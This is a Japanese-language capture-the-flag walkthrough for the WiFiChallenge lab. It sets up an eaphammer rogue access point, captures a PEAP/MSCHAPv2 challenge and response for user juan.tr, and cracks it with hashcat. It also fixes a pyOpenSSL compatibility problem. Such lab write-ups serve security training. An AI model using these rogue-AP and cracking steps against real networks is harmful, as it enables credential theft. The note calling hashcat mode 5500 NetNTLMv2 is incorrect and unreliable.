# 18. What is juan’s wifi-corp password?[](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/#18-what-is-juans-wifi-corp-password)

juanのwifi-corpのパスワードは何ですか？

![[Pasted image 20261123132057.png]]

MGTネットワーク上の信頼できないクライアントを攻撃するには、同じESSIDと設定を持つRogueAPを作成する必要があります。
ただし、自己署名証明書を使用し、クライアントが証明書を手動で検証する場合に備えて、できれば本物の証明書と同じデータを使用するのが望ましいです。
これを行うには、「eaphammer」を使用できます。

```zsh
sudo eaphammer --cert-wizard
```


※eaphammer Error
```zsh
python3 -c 'import sys, OpenSSL; from OpenSSL import crypto; print("Python:", sys.executable); print("pyOpenSSL:", OpenSSL.__version__); print("X509Req available:", hasattr(crypto, "X509Req"))'
```
![[Pasted image 20261123124019.png]]

今回はソースコードを書き換えるより、**EAPHammer専用のPython仮想環境を作り、互換性のあるバージョンを使う方法**が安全です。

pyOpenSSL 25.3.0では `X509Req` がまだ利用できます。
一方、26.3.0で削除されています。また、25.3.0の対応するcryptographyの上限は46系です。

pyOpenSSL 26.4.0 documentation+1

## **Step 2：EAPHammer専用環境の作成**

以下を実行してください。

```zsh
sudo python3 -m venv --system-site-packages /opt/eaphammer-venv

sudo /opt/eaphammer-venv/bin/pip install \
  pyOpenSSL==25.3.0 \
  cryptography==46.0.3
```

この方法なら、Kali標準のpyOpenSSL 26.4.0やcryptography 49.0.0は変更されません。

## **Step 3：互換性の確認**

```
sudo /opt/eaphammer-venv/bin/python -c \
'import OpenSSL, cryptography; from OpenSSL import crypto; print("pyOpenSSL:", OpenSSL.__version__); print("cryptography:", cryptography.__version__); print("X509Req available:", hasattr(crypto, "X509Req"))'
```

期待する結果は次のとおりです。

```
pyOpenSSL: 25.3.0
cryptography: 46.0.3
X509Req available: True
```

ここまで確認できたら、EAPHammerを専用環境のPythonで起動します。既存のCA秘密鍵はそのまま保持します。

```zsh
sudo /opt/eaphammer-venv/bin/python \
  /usr/share/eaphammer/eaphammer --cert-wizard
```

今回の重要な取得結果は次のとおりです。

|項目|取得値|
|---|---|
|Domain|`CONTOSO`|
|Username|`juan.tr`|
|EAP方式|PEAP / MSCHAPv2|
|Challenge|`b7e1dbcc5899e67d`|
|Response|`b588c64075ebfa78db3bd6d3b2a1bc9b66284359aa13a80f`|

## **次のステップ：Hashcatで解析**

EAPHammerが出力したHashcat形式の行をファイルに保存します。

```
nano hashcat.5500
```

以下を1行で貼り付けて保存してください。

```
juan.tr::::b588c64075ebfa78db3bd6d3b2a1bc9b66284359aa13a80f:b7e1dbcc5899e67d
```

次に、Hashcatを実行します。

```
hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force
```

結果を確認します。

```
hashcat -m 5500 hashcat.5500 --show
```

**補足：** Hashcatの `-m 5500` は NetNTLMv1 ではなく、NetNTLMv2 用のモードです。今回のEAPHammer出力に対応します。

パスワードが解析できたら、その結果を貼ってください。次は `wifi-corp` のWebサイトへのログインとFlag取得に進みます。

## 接続ファイルの作成

